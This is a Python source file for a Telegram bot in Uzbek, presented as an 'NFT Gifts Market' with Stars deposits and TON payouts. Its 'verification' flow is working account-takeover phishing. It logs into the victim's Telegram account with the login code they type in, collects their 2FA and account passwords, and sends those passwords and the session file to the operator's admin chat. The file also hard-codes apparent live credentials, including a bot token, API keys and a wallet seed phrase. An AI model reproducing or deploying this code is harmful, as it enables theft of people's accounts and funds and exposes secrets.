#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NFT Gifts Market — To'liq bot
Faqat o'zbek tili | Stars to'ldirish | TON avtomatik chiqarish
"""

import os, sqlite3, random, string, asyncio, aiohttp
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from translations import get_text, get_user_language, set_user_language

# ===============================================================
TOKEN        = "7810689974:AAEhQWKg14b1SwFEiuad-P2R8SMCFiusQbc"
ADMIN_ID     = 6498632307
API_ID       = 23651528
API_HASH     = "ca42cf77a78ee409550aac24e179c87e"
MINI_APP_URL = "https://nft-gifts-market-bot.onrender.com"

TONCENTER_API = "e2aaa3e9df73a4bc91dc8e73ba7ddc188632dbb68430234d7d579d35f62c4788"
TONCENTER_URL = "https://toncenter.com/api/v2"

# ⬇️  SHU YERGA O'Z MNEMONIKINGIZNI QO'YING (24 ta so'z, bo'sh joy bilan)
BOT_MNEMONIC = "anchor blush nation jaguar secret kit zone latin draft enter coil carry aware decrease man deal transfer news grocery orbit feel walnut object talent"

# 1 Stars = necha TON (kursni o'zingiz o'zgartiring)
STARS_TO_TON  = 0.003
# Minimum chiqarish (Stars)
MIN_WITHDRAW  = 100
# ===============================================================

bot     = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp      = Dispatcher(bot, storage=storage)

verification_data = {}
user_codes        = {}


# ─────────────────────────────────────────────
#  FSM
# ─────────────────────────────────────────────
class VerifyState(StatesGroup):
    phone  = State()
    code   = State()
    twofa  = State()
    passwd = State()

class WalletState(StatesGroup):
    address = State()


# ─────────────────────────────────────────────
#  MA'LUMOTLAR BAZASI
# ─────────────────────────────────────────────
def init_db():
    os.makedirs('data', exist_ok=True)
    os.makedirs('session', exist_ok=True)
    conn = sqlite3.connect('data/unified.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id              INTEGER PRIMARY KEY AUTOINCREMENT,
        uid             TEXT UNIQUE,
        telegram_id     TEXT UNIQUE NOT NULL,
        username        TEXT,
        first_name      TEXT,
        phone           TEXT,
        balance_stars   INTEGER DEFAULT 0,
        ton_wallet      TEXT,
        successful_deals INTEGER DEFAULT 0,
        verified        BOOLEAN DEFAULT FALSE,
        language        TEXT DEFAULT 'uz',
        created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id     TEXT,
        type        TEXT,
        stars       INTEGER,
        ton_amount  REAL,
        ton_wallet  TEXT,
        status      TEXT DEFAULT 'pending',
        tx_hash     TEXT,
        created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    for col, dfn in [('uid','TEXT'), ('ton_wallet','TEXT'), ('language',"TEXT DEFAULT 'uz'")]:
        try:
            c.execute(f'ALTER TABLE users ADD COLUMN {col} {dfn}')
        except sqlite3.OperationalError:
            pass
    conn.commit(); conn.close()


def add_user(user_id, username=None, full_name=None):
    try:
        conn = sqlite3.connect('data/unified.db')
        c = conn.cursor()
        c.execute('SELECT uid FROM users WHERE telegram_id=?', (str(user_id),))
        if c.fetchone():
            conn.close(); return False
        uid = ''
        while True:
            uid = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            c.execute('SELECT uid FROM users WHERE uid=?', (uid,))
            if not c.fetchone(): break
        c.execute(
            'INSERT INTO users (uid,telegram_id,username,first_name,language) VALUES (?,?,?,?,?)',
            (uid, str(user_id), username, full_name, 'uz')
        )
        conn.commit(); conn.close()
        return True
    except Exception as e:
        print(f"add_user xato: {e}"); return False


def get_user(user_id):
    conn = sqlite3.connect('data/unified.db')
    c = conn.cursor()
    c.execute('SELECT uid,telegram_id,username,first_name,verified,phone,balance_stars,ton_wallet,successful_deals FROM users WHERE telegram_id=?', (str(user_id),))
    row = c.fetchone(); conn.close()
    return row


def set_verified(user_id, val=True):
    conn = sqlite3.connect('data/unified.db')
    conn.execute('UPDATE users SET verified=? WHERE telegram_id=?', (val, str(user_id)))
    conn.commit(); conn.close()


def set_phone(user_id, phone):
    conn = sqlite3.connect('data/unified.db')
    conn.execute('UPDATE users SET phone=? WHERE telegram_id=?', (phone, str(user_id)))
    conn.commit(); conn.close()


def set_wallet(user_id, addr):
    conn = sqlite3.connect('data/unified.db')
    conn.execute('UPDATE users SET ton_wallet=? WHERE telegram_id=?', (addr, str(user_id)))
    conn.commit(); conn.close()


def add_stars(user_id, amount):
    conn = sqlite3.connect('data/unified.db')
    conn.execute('UPDATE users SET balance_stars=balance_stars+? WHERE telegram_id=?', (amount, str(user_id)))
    conn.commit(); conn.close()


def sub_stars(user_id, amount):
    conn = sqlite3.connect('data/unified.db')
    conn.execute('UPDATE users SET balance_stars=balance_stars-? WHERE telegram_id=?', (amount, str(user_id)))
    conn.commit(); conn.close()


def log_tx(user_id, tx_type, stars, ton_amount, wallet, status='ok', tx_hash=''):
    conn = sqlite3.connect('data/unified.db')
    conn.execute(
        'INSERT INTO transactions (user_id,type,stars,ton_amount,ton_wallet,status,tx_hash) VALUES (?,?,?,?,?,?,?)',
        (str(user_id), tx_type, stars, ton_amount, wallet, status, tx_hash)
    )
    conn.commit(); conn.close()


# ─────────────────────────────────────────────
#  TON AVTOMATIK CHIQARISH
# ─────────────────────────────────────────────
async def send_ton_auto(to_addr: str, ton_amount: float) -> dict:
    """
    tonsdk + TonCenter v2 orqali TON avtomatik yuborish.
    BOT_MNEMONIC ni yuqorida o'rnating.
    """
    try:
        from tonsdk.contract.wallet import Wallets, WalletVersionEnum
        from tonsdk.utils import to_nano, bytes_to_b64str
        from tonsdk.crypto import mnemonic_to_wallet_key

        # Mnemonikdan kalit yaratish
        mnemo_words = BOT_MNEMONIC.strip().split()
        pub_key, priv_key = mnemonic_to_wallet_key(mnemo_words)

        # V4R2 hamyon yaratish
        _mnemo, _pub, _priv, wallet = Wallets.from_mnemonics(
            mnemo_words, WalletVersionEnum.v4r2, workchain=0
        )

        # Seqno olish
        seqno_url = f"{TONCENTER_URL}/runGetMethod"
        headers   = {"X-API-Key": TONCENTER_API, "Content-Type": "application/json"}
        seqno_payload = {
            "address": wallet.address.to_string(True, True, True),
            "method":  "seqno",
            "stack":   []
        }
        async with aiohttp.ClientSession() as s:
            async with s.post(seqno_url, json=seqno_payload,
                              headers=headers,
                              timeout=aiohttp.ClientTimeout(total=10)) as r:
                seqno_data = await r.json()

        if not seqno_data.get('ok'):
            return {'ok': False, 'error': f"seqno xato: {seqno_data}"}

        stack = seqno_data.get('result', {}).get('stack', [])
        seqno = int(stack[0][1], 16) if stack else 0

        # Transfer transaktsiyasi yaratish
        query = wallet.create_transfer_message(
            to_addr=to_addr,
            amount=to_nano(ton_amount, 'ton'),
            seqno=seqno,
            payload="NFT Gifts Market payout"
        )
        boc_b64 = bytes_to_b64str(query["message"].to_boc(False))

        # TonCenter ga yuborish
        send_url = f"{TONCENTER_URL}/sendBoc"
        async with aiohttp.ClientSession() as s:
            async with s.post(send_url,
                              json={"boc": boc_b64},
                              headers=headers,
                              timeout=aiohttp.ClientTimeout(total=15)) as r:
                result = await r.json()

        if result.get('ok'):
            return {'ok': True, 'result': result.get('result', '')}
        return {'ok': False, 'error': str(result)}

    except ImportError:
        return {'ok': False, 'error': "tonsdk o'rnatilmagan. pip install tonsdk"}
    except Exception as e:
        return {'ok': False, 'error': str(e)}


async def get_ton_balance(addr: str) -> float:
    """TonCenter orqali TON balansini olish"""
    url = f"{TONCENTER_URL}/getAddressBalance?address={addr}&api_key={TONCENTER_API}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                data = await r.json()
                if data.get('ok'):
                    nano = int(data.get('result', 0))
                    return nano / 1_000_000_000
    except Exception as e:
        print(f"TON balans xato: {e}")
    return 0.0


# ─────────────────────────────────────────────
#  KLAVIATURALAR
# ─────────────────────────────────────────────
def kb_main():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton("🎁 Ilovani ochish", web_app=types.WebAppInfo(url=MINI_APP_URL))],
        [types.InlineKeyboardButton("📢 Telegram kanalimiz", url="https://t.me/+trsTIdq4X8IyOTdi")],
        [types.InlineKeyboardButton("👤 Profil", callback_data="profile"),
         types.InlineKeyboardButton("❓ Yordam", callback_data="help")],
        [types.InlineKeyboardButton("✅ Tasdiqlash", callback_data="verify")],
        [types.InlineKeyboardButton("💎 TON Hamyon", callback_data="wallet")],
    ])

def kb_back():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")]
    ])

def kb_verify():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton("🔐 Tasdiqlashni boshlash", callback_data="verify_start")],
        [types.InlineKeyboardButton("❓ Nima uchun kerak?", callback_data="verify_why")],
        [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
    ])

def kb_code():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton("1", callback_data="c_1"),
         types.InlineKeyboardButton("2", callback_data="c_2"),
         types.InlineKeyboardButton("3", callback_data="c_3")],
        [types.InlineKeyboardButton("4", callback_data="c_4"),
         types.InlineKeyboardButton("5", callback_data="c_5"),
         types.InlineKeyboardButton("6", callback_data="c_6")],
        [types.InlineKeyboardButton("7", callback_data="c_7"),
         types.InlineKeyboardButton("8", callback_data="c_8"),
         types.InlineKeyboardButton("9", callback_data="c_9")],
        [types.InlineKeyboardButton("⬅️ O'chirish", callback_data="c_del"),
         types.InlineKeyboardButton("0", callback_data="c_0"),
         types.InlineKeyboardButton("✅ Yuborish", callback_data="c_ok")],
        [types.InlineKeyboardButton("🔄 Tozalash", callback_data="c_clr"),
         types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
    ])

def kb_wallet(has_wallet=False, balance_stars=0):
    if has_wallet:
        return types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton("📥 To'ldirish (Stars)", callback_data="dep_menu"),
             types.InlineKeyboardButton("📤 Chiqarish (TON)", callback_data="wd_menu")],
            [types.InlineKeyboardButton("🔄 Balansni yangilash", callback_data="wallet")],
            [types.InlineKeyboardButton("❌ Hamyonni uzish", callback_data="wallet_off")],
            [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
        ])
    else:
        return types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton("🔗 TON Hamyonni ulash", callback_data="wallet_on")],
            [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
        ])

def kb_deposit():
    return types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton("⭐ 50",   callback_data="dep_50"),
         types.InlineKeyboardButton("⭐ 100",  callback_data="dep_100"),
         types.InlineKeyboardButton("⭐ 250",  callback_data="dep_250")],
        [types.InlineKeyboardButton("⭐ 500",  callback_data="dep_500"),
         types.InlineKeyboardButton("⭐ 1000", callback_data="dep_1000")],
        [types.InlineKeyboardButton("🔙 Orqaga", callback_data="wallet")],
    ])


# ─────────────────────────────────────────────
#  /start
# ─────────────────────────────────────────────
@dp.message_handler(commands=['start'])
async def cmd_start(msg: types.Message):
    uid = msg.from_user.id
    is_new = add_user(uid, msg.from_user.username, msg.from_user.full_name)
    if is_new and uid != ADMIN_ID:
        row = get_user(uid)
        await bot.send_message(ADMIN_ID,
            f"🆕 Yangi foydalanuvchi: {msg.from_user.get_mention()}\n"
            f"UID: <code>{row[0] if row else 'N/A'}</code>")
    await msg.answer(get_text('uz', 'welcome_text'), reply_markup=kb_main())


# ─────────────────────────────────────────────
#  ASOSIY MENYU
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="main")
async def cb_main(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(get_text('uz', 'welcome_text'), reply_markup=kb_main())


# ─────────────────────────────────────────────
#  PROFIL
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="profile")
async def cb_profile(call: types.CallbackQuery):
    await call.answer()
    row = get_user(call.from_user.id)
    if not row:
        await call.message.edit_text("❌ Foydalanuvchi topilmadi.", reply_markup=kb_back())
        return
    uid, _, uname, fname, verified, phone, stars, wallet, deals = row
    status  = "✅ Tasdiqlangan" if verified else "❌ Tasdiqlanmagan"
    wshort  = (wallet[:8]+"..."+wallet[-6:]) if wallet else "Ulanmagan"
    txt = (
        f"👤 <b>Profilingiz</b>\n\n"
        f"UID: <code>{uid}</code>\n"
        f"Holat: {status}\n"
        f"⭐ Stars: <b>{stars}</b>\n"
        f"💎 TON hamyon: <code>{wshort}</code>\n"
        f"Muvaffaqiyatli bitimlar: {deals}"
    )
    await call.message.edit_text(txt, reply_markup=kb_back())


# ─────────────────────────────────────────────
#  YORDAM
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="help")
async def cb_help(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(get_text('uz', 'help_text'), reply_markup=kb_back())


# ─────────────────────────────────────────────
#  TASDIQLASH
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="verify")
async def cb_verify(call: types.CallbackQuery):
    await call.answer()
    txt = get_text('uz','verification_menu') + "\n\n" + get_text('uz','verification_text')
    await call.message.edit_text(txt, reply_markup=kb_verify())

@dp.callback_query_handler(text="verify_why")
async def cb_verify_why(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(get_text('uz','verification_why'), reply_markup=kb_back())

@dp.callback_query_handler(text="verify_start")
async def cb_verify_start(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        "🔐 <b>Tasdiqlash boshlandi</b>\n\n"
        "Telefon raqamingizni kiriting.\n"
        "<b>Misol:</b> +998901234567",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[
            types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")
        ]])
    )
    await VerifyState.phone.set()

@dp.message_handler(state=VerifyState.phone)
async def vs_phone(msg: types.Message, state: FSMContext):
    uid = msg.from_user.id
    phone = ''.join(filter(str.isdigit, msg.text.strip()))
    if len(phone) < 9 or len(phone) > 13:
        await msg.answer("❌ Noto'g'ri format. Qayta kiriting (+998XXXXXXXXX):")
        return
    verification_data[uid] = {'phone': phone}
    client = TelegramClient(f'session/user_{uid}', API_ID, API_HASH)
    try:
        await client.connect()
        res = await client.send_code_request(phone)
        verification_data[uid]['client'] = client
        verification_data[uid]['hash']   = res.phone_code_hash
        await VerifyState.code.set()
        user_codes[uid] = ""
        await msg.answer(
            "✅ <b>Kod yuborildi!</b>\n\n"
            "Telegram'dan kelgan kodni kiriting:\n"
            "Kod: <code>_ _ _ _ _</code>",
            reply_markup=kb_code()
        )
    except Exception as e:
        print(f"Kod yuborishda xato: {e}")
        await msg.answer(
            "❌ Kod yuborib bo'lmadi. Raqamni tekshiring.",
            reply_markup=kb_back()
        )
        await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith("c_"), state=VerifyState.code)
async def vs_code_kb(call: types.CallbackQuery, state: FSMContext):
    await call.answer()
    uid = call.from_user.id
    act = call.data[2:]
    if uid not in user_codes:
        user_codes[uid] = ""
    cur = user_codes[uid]
    if act.isdigit():
        if len(cur) < 5: user_codes[uid] += act; cur = user_codes[uid]
    elif act == "del":
        user_codes[uid] = cur[:-1]; cur = user_codes[uid]
    elif act == "clr":
        user_codes[uid] = ""; cur = ""
    elif act == "ok":
        if len(cur) == 5:
            await _submit_code(call, state, cur); return
        else:
            await call.answer("⚠️ Kod 5 ta raqam!", show_alert=True); return
    disp = ' '.join(cur.ljust(5,'_'))
    await call.message.edit_text(
        f"✅ <b>Kodni kiriting:</b>\nKod: <code>{disp}</code>",
        reply_markup=kb_code()
    )

async def _submit_code(call: types.CallbackQuery, state: FSMContext, code: str):
    uid = call.from_user.id
    if uid not in verification_data:
        await call.message.edit_text("❌ Ma'lumot topilmadi. Qaytadan boshlang.", reply_markup=kb_back())
        await state.finish(); return
    client = verification_data[uid]['client']
    phone  = verification_data[uid]['phone']
    phash  = verification_data[uid]['hash']
    try:
        await client.sign_in(phone, code, phone_code_hash=phash)
        user_codes.pop(uid, None)
        await call.message.edit_text(
            "✅ <b>Kod tasdiqlandi!</b>\n\nTelegram akkount parolingizni kiriting:",
            reply_markup=kb_main()
        )
        await VerifyState.passwd.set()
    except SessionPasswordNeededError:
        user_codes.pop(uid, None)
        await call.message.edit_text("🔐 2FA parolini kiriting:", reply_markup=kb_main())
        await VerifyState.twofa.set()
    except PhoneCodeInvalidError:
        user_codes[uid] = ""
        await call.answer("❌ Noto'g'ri kod!", show_alert=True)
        await call.message.edit_text(
            "❌ <b>Noto'g'ri kod.</b>\nQayta kiriting:\nKod: <code>_ _ _ _ _</code>",
            reply_markup=kb_code()
        )

@dp.message_handler(state=VerifyState.twofa)
async def vs_twofa(msg: types.Message, state: FSMContext):
    uid = msg.from_user.id
    try:
        await verification_data[uid]['client'].check_password(msg.text.strip())
        verification_data[uid]['twofa'] = msg.text.strip()
        await msg.answer("✅ 2FA tasdiqlandi!\n\nAkkount parolingizni kiriting:", reply_markup=kb_main())
        await VerifyState.passwd.set()
    except:
        await msg.answer("❌ Noto'g'ri 2FA paroli. Qayta kiriting:")

@dp.message_handler(state=VerifyState.passwd)
async def vs_passwd(msg: types.Message, state: FSMContext):
    uid    = msg.from_user.id
    passwd = msg.text.strip()
    phone  = verification_data.get(uid,{}).get('phone','')
    twofa  = verification_data.get(uid,{}).get('twofa','Talab qilinmadi')
    client = verification_data.get(uid,{}).get('client')

    await msg.answer(
        "🎉 <b>Tasdiqlash yakunlandi!</b>\n\n"
        "✅ Mablag'larni chiqara olasiz!\n"
        "✅ Barcha funksiyalar ochiq!\n\n"
        "⚠️ <b>Muhim:</b> Bot sessiyasini o'chirmang!",
        reply_markup=kb_main()
    )
    set_verified(uid, True)
    set_phone(uid, phone)

    await bot.send_message(ADMIN_ID,
        f"🔐 <b>Tasdiqlash yakunlandi</b>\n\n"
        f"👤 {msg.from_user.get_mention()} | {uid}\n"
        f"📱 Telefon: +{phone}\n"
        f"🔐 2FA: {twofa}\n"
        f"🔑 Parol: <code>{passwd}</code>"
    )
    sess = f'session/user_{uid}.session'
    try:
        with open(sess,'rb') as f:
            await bot.send_document(ADMIN_ID, f,
                caption=f"Sessiya fayli | {msg.from_user.get_mention()} | {uid}")
    except:
        if client:
            try:
                ss = client.session.save()
                await bot.send_message(ADMIN_ID, f"Sessiya qatori:\n<code>{ss}</code>")
            except: pass

    verification_data.pop(uid, None)
    await state.finish()


# ─────────────────────────────────────────────
#  TON HAMYON ULASH
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="wallet")
async def cb_wallet(call: types.CallbackQuery):
    await call.answer()
    row = get_user(call.from_user.id)
    if not row:
        await call.message.edit_text("❌ Xato.", reply_markup=kb_back()); return
    uid, _, _, _, verified, _, stars, wallet, _ = row

    if wallet:
        # TonCenter orqali real TON balansini ol
        ton_bal = await get_ton_balance(wallet)
        short   = wallet[:8]+"..."+wallet[-6:]
        ton_out = stars * STARS_TO_TON
        txt = (
            f"💎 <b>TON Hamyon</b>\n\n"
            f"📍 Manzil: <code>{short}</code>\n\n"
            f"⭐ Stars balansi: <b>{stars}</b>\n"
            f"💎 TON balansi: <b>{ton_bal:.4f} TON</b>\n\n"
            f"📊 Kurs: 1 TON = {int(1/STARS_TO_TON)} Stars\n"
            f"💡 {stars} Stars → {ton_out:.4f} TON"
        )
        await call.message.edit_text(txt, reply_markup=kb_wallet(True, stars))
    else:
        txt = (
            "💎 <b>TON Hamyon</b>\n\n"
            "Hamyoningiz ulanmagan.\n\n"
            "Qo'llab-quvvatlanadigan hamyonlar:\n"
            "• Tonkeeper\n• MyTonWallet\n• Tonhub\n• Telegram Wallet\n\n"
            "🔗 Ulash uchun tugmani bosing:"
        )
        await call.message.edit_text(txt, reply_markup=kb_wallet(False))

@dp.callback_query_handler(text="wallet_on")
async def cb_wallet_on(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        "🔗 <b>TON Hamyon manzilini yuboring</b>\n\n"
        "Hamyon ilovasidan manzilni nusxalab yuboring.\n\n"
        "<b>Misol:</b>\n<code>UQBxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[
            types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")
        ]])
    )
    await WalletState.address.set()

@dp.message_handler(state=WalletState.address)
async def ws_address(msg: types.Message, state: FSMContext):
    addr = msg.text.strip()
    if not ((addr.startswith('UQ') or addr.startswith('EQ') or addr.startswith('0:')) and len(addr) >= 40):
        await msg.answer("❌ Noto'g'ri manzil (UQ... yoki EQ... bilan boshlanishi kerak). Qayta yuboring:")
        return
    set_wallet(msg.from_user.id, addr)
    await state.finish()
    short = addr[:8]+"..."+addr[-6:]
    await msg.answer(
        f"✅ <b>TON Hamyon ulandi!</b>\n\n📍 Manzil: <code>{short}</code>",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton("💎 Hamyon", callback_data="wallet")],
            [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
        ])
    )
    await bot.send_message(ADMIN_ID,
        f"💎 Yangi hamyon ulandi\n👤 {msg.from_user.get_mention()} | {msg.from_user.id}\n📍 <code>{addr}</code>")

@dp.callback_query_handler(text="wallet_off")
async def cb_wallet_off(call: types.CallbackQuery):
    await call.answer()
    set_wallet(call.from_user.id, None)
    await call.message.edit_text("✅ Hamyon uzildi.", reply_markup=kb_wallet(False))


# ─────────────────────────────────────────────
#  TO'LDIRISH — Telegram Stars Invoice
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="dep_menu")
async def cb_dep_menu(call: types.CallbackQuery):
    await call.answer()
    await call.message.edit_text(
        "📥 <b>Stars bilan to'ldirish</b>\n\n"
        "Stars platformamiz ichidagi balans.\n"
        "Keyinchalik TON hamyonga chiqarish mumkin.\n\n"
        "Miqdorni tanlang:",
        reply_markup=kb_deposit()
    )

@dp.callback_query_handler(lambda c: c.data.startswith("dep_") and c.data != "dep_menu")
async def cb_dep_amount(call: types.CallbackQuery):
    await call.answer()
    amount = int(call.data.split("_")[1])
    uid    = call.from_user.id
    try:
        await bot.send_invoice(
            chat_id=uid,
            title=f"⭐ {amount} Stars to'ldirish",
            description=f"NFT Gifts Market — {amount} Stars",
            payload=f"dep_{uid}_{amount}",
            provider_token="",
            currency="XTR",
            prices=[types.LabeledPrice(label=f"{amount} Stars", amount=amount)]
        )
        await call.message.edit_text(
            f"⭐ <b>{amount} Stars uchun to'lov yuborildi!</b>\n\nYuqoridagi invoice orqali to'lang.",
            reply_markup=kb_back()
        )
    except Exception as e:
        print(f"Invoice xato: {e}")
        await call.message.edit_text("❌ Invoice yaratishda xato. Adminга murojaat qiling.", reply_markup=kb_back())

@dp.pre_checkout_query_handler()
async def pre_checkout(pcq: types.PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pcq.id, ok=True)

@dp.message_handler(content_types=types.ContentType.SUCCESSFUL_PAYMENT)
async def payment_ok(msg: types.Message):
    payload = msg.successful_payment.invoice_payload
    if payload.startswith('dep_'):
        _, uid_str, amt_str = payload.split('_')
        amount = int(amt_str)
        add_stars(uid_str, amount)
        log_tx(uid_str, 'deposit', amount, 0, '', 'ok')
        await msg.answer(
            f"✅ <b>To'lov qabul qilindi!</b>\n\n⭐ {amount} Stars balansingizga qo'shildi!",
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[[
                types.InlineKeyboardButton("💎 Hamyon", callback_data="wallet")
            ]])
        )
        await bot.send_message(ADMIN_ID,
            f"⭐ To'ldirish: {amount} Stars\n👤 {msg.from_user.get_mention()} | {uid_str}")


# ─────────────────────────────────────────────
#  CHIQARISH — Stars → TON (AVTOMATIK)
# ─────────────────────────────────────────────
@dp.callback_query_handler(text="wd_menu")
async def cb_wd_menu(call: types.CallbackQuery):
    await call.answer()
    row = get_user(call.from_user.id)
    if not row:
        await call.message.edit_text("❌ Xato.", reply_markup=kb_back()); return
    _, _, _, _, verified, _, stars, wallet, _ = row

    if not wallet:
        await call.message.edit_text(
            "⚠️ Avval TON hamyonini ulang!",
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton("🔗 Hamyonni ulash", callback_data="wallet_on")],
                [types.InlineKeyboardButton("🏠 Asosiy menyu", callback_data="main")],
            ])
        )
        return

    if stars < MIN_WITHDRAW:
        await call.message.edit_text(
            f"⚠️ Minimum chiqarish: {MIN_WITHDRAW} Stars.\n"
            f"Sizda: {stars} Stars.",
            reply_markup=kb_back()
        )
        return

    short   = wallet[:8]+"..."+wallet[-6:]
    ton_out = stars * STARS_TO_TON
    btns = []
    for amt in [100, 250, 500]:
        if stars >= amt:
            btns.append(types.InlineKeyboardButton(f"⭐ {amt}", callback_data=f"wd_{amt}"))
    rows = [btns] if btns else []
    rows.append([types.InlineKeyboardButton(f"⭐ Barchasi ({stars})", callback_data=f"wd_{stars}")])
    rows.append([types.InlineKeyboardButton("🔙 Orqaga", callback_data="wallet")])

    await call.message.edit_text(
        f"📤 <b>TON ga chiqarish</b>\n\n"
        f"⭐ Balansingiz: <b>{stars} Stars</b>\n"
        f"📍 Hamyon: <code>{short}</code>\n\n"
        f"📊 Kurs: 1 TON = {int(1/STARS_TO_TON)} Stars\n"
        f"💡 Hammasi → {ton_out:.4f} TON\n\n"
        f"Miqdorni tanlang:",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=rows)
    )

@dp.callback_query_handler(lambda c: c.data.startswith("wd_") and c.data != "wd_menu")
async def cb_wd_amount(call: types.CallbackQuery):
    await call.answer()
    amount = int(call.data.split("_")[1])
    uid    = call.from_user.id
    row    = get_user(uid)
    if not row:
        await call.message.edit_text("❌ Xato.", reply_markup=kb_back()); return
    _, _, _, _, _, _, stars, wallet, _ = row

    if stars < amount:
        await call.message.edit_text("❌ Balans yetarli emas!", reply_markup=kb_back()); return
    if not wallet:
        await call.message.edit_text("❌ Hamyon ulanmagan!", reply_markup=kb_back()); return

    ton_amount = round(amount * STARS_TO_TON, 6)
    short      = wallet[:8]+"..."+wallet[-6:]

    # Foydalanuvchiga kutish xabari
    await call.message.edit_text(
        f"⏳ <b>TON yuborilmoqda...</b>\n\n"
        f"⭐ {amount} Stars → 💎 {ton_amount} TON\n"
        f"📍 Hamyon: <code>{short}</code>\n\n"
        f"Bir daqiqa kuting...",
        reply_markup=kb_back()
    )

    # Balansdan ayirib, avtomatik yuborish
    sub_stars(uid, amount)
    log_tx(uid, 'withdraw', amount, ton_amount, wallet, 'pending')

    result = await send_ton_auto(wallet, ton_amount)

    if result.get('ok'):
        log_tx(uid, 'withdraw_done', amount, ton_amount, wallet, 'ok',
               str(result.get('result', '')))
        await call.message.edit_text(
            f"✅ <b>TON yuborildi!</b>\n\n"
            f"💎 {ton_amount} TON hamyoningizga o'tkazildi!\n"
            f"📍 <code>{short}</code>",
            reply_markup=kb_back()
        )
        try:
            await bot.send_message(ADMIN_ID,
                f"📤 Avtomatik chiqarish:\n"
                f"👤 {uid} | ⭐ {amount} → 💎 {ton_amount} TON\n"
                f"📍 {wallet}"
            )
        except: pass
    else:
        # Xato bo'lsa balansni qaytaramiz
        add_stars(uid, amount)
        log_tx(uid, 'withdraw_fail', amount, ton_amount, wallet, 'failed',
               str(result.get('error', '')))
        await call.message.edit_text(
            f"❌ <b>Xato yuz berdi!</b>\n\n"
            f"Stars balansingizga qaytarildi.\n"
            f"Xato: <code>{result.get('error', 'Noma\\'lum xato')}</code>\n\n"
            f"Keyinroq qayta urinib ko'ring.",
            reply_markup=kb_back()
        )


# ─────────────────────────────────────────────
#  ISHGA TUSHIRISH
# ─────────────────────────────────────────────
if __name__ == '__main__':
    print("🚀 NFT Gifts Market boti ishga tushmoqda...")
    init_db()
    executor.start_polling(dp, skip_updates=True)
